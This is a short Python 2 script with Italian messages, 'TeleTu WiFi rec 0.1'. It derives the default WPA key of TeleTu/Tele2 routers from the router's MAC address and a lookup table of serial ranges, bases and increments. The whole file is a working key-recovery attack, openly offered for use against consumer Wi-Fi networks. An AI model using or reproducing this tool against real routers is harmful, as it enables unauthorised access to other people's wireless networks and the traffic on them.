#   This program is free software; you can redistribute it and/or modify  
#   it under the terms of the GNU General Public License as published by  
#   the Free Software Foundation; either version 2 of the License, or     
#   (at your option) any later version.                                   
                                                                         
#   This program is distributed in the hope that it will be useful,       
#   but WITHOUT ANY WARRANTY; without even the implied warranty of        
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         
#   GNU General Public License for more details.    

import sys
import fileinput

help='''
*************************************************
*                                               * 
* TeleTu WiFi rec 0.1 - (C) 2011 giaba90        *
* https://twitter.com/#!/giaba90                *
*                                               *
*************************************************
		
usage: python teletuwifi-0.1.py <mac_addres> <file_input> 
	 
Example: python teletuwifi-0.1.py 00:23:8E:E5:28:C7 Tele2.txt 
'''
	 
class TeleTu:
	def __init__(self):
		" "
	def stampa(self,mac_addr,sn1,ris):
		print "*************************************"
		print "*                                   *"
		print "* MAC inserito ="+mac_addr+     "   *"
		print "* WPA = "+sn1+'Y'+ris+"                 *"
		print "*                                   *"
		print "*************************************"
	def crack(self,mac_addr,fin):	
		wmac=mac_addr[:8]
		mac6=mac_addr[9:17]
		try:
			for riga in fileinput.input(fin):
				da=riga[9:17]
				a=riga[18:26]
				if((riga[:8]==wmac) and (da<mac6<a)):	
					sn1=riga[27:32]
					base=riga[33:39]
					inc=riga[40]
					esito=True
					break
				else:
					esito=False
		except IOError:
			print "Il file non e' presente nella directory"
			sys.exit()
#se il mac e' dentro la la tabella esito e' vero altrimenti e' falso,quindi stampo un avviso	
		if(not(esito)):	
			print "Mac non presente nella lista"
			sys.exit()
		mac6=mac6.replace(':','') 
		mac6=int(mac6,16)
		base=int(base,16)
		inc=int(inc)
		ris=mac6-base
		ris=ris/inc
		ris=str(ris)
		self.stampa(mac_addr,sn1,ris)

if __name__ == '__main__':
	if(len(sys.argv)<2):
		print help
	else:
		mac_addr=sys.argv[1]
		fin=sys.argv[2]
		t=TeleTu()
		t.crack(mac_addr,fin)